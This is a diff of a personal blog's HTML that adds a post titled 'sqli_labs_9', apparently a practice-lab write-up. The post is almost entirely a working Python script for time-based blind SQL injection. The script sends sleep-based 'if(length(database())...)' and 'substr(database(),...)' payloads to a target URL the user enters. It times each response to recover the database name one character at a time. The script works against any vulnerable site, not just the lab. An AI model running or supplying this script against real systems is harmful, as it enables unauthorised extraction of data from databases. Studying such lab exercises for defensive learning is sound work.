@@ -22,7 +22,7 @@
 
   
 
-  <title>LINKS | main1o</title>
+  <title>sqli_labs_9 | main1o</title>
 
   
 
@@ -43,9 +43,9 @@
   <div class="root-container">
     
 <!-- header container -->
-<header class="header-container">
+<header class="header-container post">
   
-    <div class="post-image" style="background-image: url(/5.png)"></div>
+    <div class="post-image" style="background-image: url(/images/cover/wallhaven_1k185g.png)"></div>
   
 
   <!-- navbar -->
@@ -93,36 +93,84 @@
 
   
   
-
-  
-  
     <div class="header-content">
-      <div class="post-text layout-block layout-padding">
-        <h1 class="title-wrap">LINKS</h1>
-        
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">sqli_labs_9</h1>
+          <h2 class="title-sub-wrap">
+            <strong>main1o</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2022-05-29T12:15:18.000Z" itemprop="datePublished">2022-05</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/python/">🏷️ python</a></li>
+  
+</ul>
+        </div>
       </div>
     </div>
+  
+
+  
   
   
 </header>
 
-    <!-- 分页(其他自定义页面) -->
+    <!-- 文章 -->
 
-<!-- 自定义页面 -->
-
+<!-- 文章内容 -->
 <div class="body-container">
   <article class="content-container layout-block post-container">
     <div class="article-info">
       
+      
+      
+      
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        
+        <p>延迟注入demo</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@@main1o</span></span><br><span class="line"><span class="string">sqli_labs_9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">payloads = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_len</span>(<span class="params">inject</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        url = <span class="string">&quot;&#123;inject&#125; and if(length(database())=&#123;i&#125;,sleep(4),0)%23&quot;</span>.<span class="built_in">format</span>(inject=inject,i=i)</span><br><span class="line">        time_1 = datetime.datetime.now()</span><br><span class="line">        requ = requests.get(url)</span><br><span class="line">        time_2 = datetime.datetime.now()</span><br><span class="line">        time_3 = (time_2-time_1).total_seconds()</span><br><span class="line">        <span class="keyword">if</span> time_3 &gt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+]当前数据库长度:<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_name</span>(<span class="params">inject</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> payloads:</span><br><span class="line">            url = <span class="string">&quot;&#123;inject&#125; and if(substr(database(),&#123;i&#125;,1)=&#x27;&#123;p&#125;&#x27;,sleep(4),1)%23&quot;</span>.<span class="built_in">format</span>(inject=inject,i=i,p=p)</span><br><span class="line">            time_1 = datetime.datetime.now()</span><br><span class="line">            requ = requests.get(url)</span><br><span class="line">            time_2 = datetime.datetime.now()</span><br><span class="line">            time_3 = (time_2-time_1).total_seconds()</span><br><span class="line">            <span class="keyword">if</span> time_3 &gt;= <span class="number">4</span>:</span><br><span class="line">                name += p</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    inject = <span class="built_in">input</span>(<span class="string">&#x27;[+]注入点(http://xxx/?id=1):&#x27;</span>)</span><br><span class="line">    database_len(inject)</span><br><span class="line">    dbname = database_name(inject)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+]当前数据库名字:<span class="subst">&#123;dbname&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
       </section>
 
       
       
+        <nav class="article-nav">
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+      <div class="card-cover" background-image-lazy data-img="/images/cover/xsi.png"></div>
+    
+    <div class="card-text">
+      
+        <a href="/posts/4acf2890/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">encrypt</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
 
-      
-      
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
     </div>
     <div class="widget-info">
       <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
@@ -157,6 +205,8 @@
     </div>
   </div>
 </section>
+
+      
 
       
 <section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
@@ -208,7 +258,6 @@
     </div>
   </article>
 </div>
-
 
     <!-- footer container -->
 <footer id="footer" class="footer">
